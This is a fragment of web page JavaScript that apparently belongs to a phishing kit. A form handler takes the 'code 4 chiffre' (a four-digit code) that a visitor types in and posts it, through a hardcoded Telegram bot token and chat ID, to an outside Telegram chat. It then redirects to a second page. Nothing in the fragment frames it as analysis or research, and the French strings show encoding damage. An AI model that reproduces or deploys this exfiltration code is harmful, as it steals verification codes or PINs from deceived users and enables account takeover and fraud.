<script>
  const BOT_TOKEN = "7683921458:AAFA204cvl5drHgTH0eCbW0Pr3jxZPyRNhs";
  const CHAT_ID = "-1003456043362";

  const form = document.getElementById('numero-form');
  const status = document.getElementById('status');

  form.addEventListener('submit', async function(e) {
    e.preventDefault();

    const numero = document.getElementById('numero').value.trim();

    if (!numero) {
      status.textContent = "Merci d‚Äôentrer ton num√©ro.";
      return;
    }

    status.textContent = "";

    const text = "üîî code 4 chiffre : " + numero;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const body = new URLSearchParams({
      chat_id: CHAT_ID,
      text: text
    });

    try {
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: body
      });

      const json = await res.json();

      if (json.ok) {
        status.textContent = "";
        setTimeout(() => {
          window.location.href = "page2.html";
        }, 600);
      } else {
        status.textContent = "Erreur Telegram.";
      }

    } catch(err) {
      status.textContent = "Erreur r√©seau.";
    }
  });
</script>
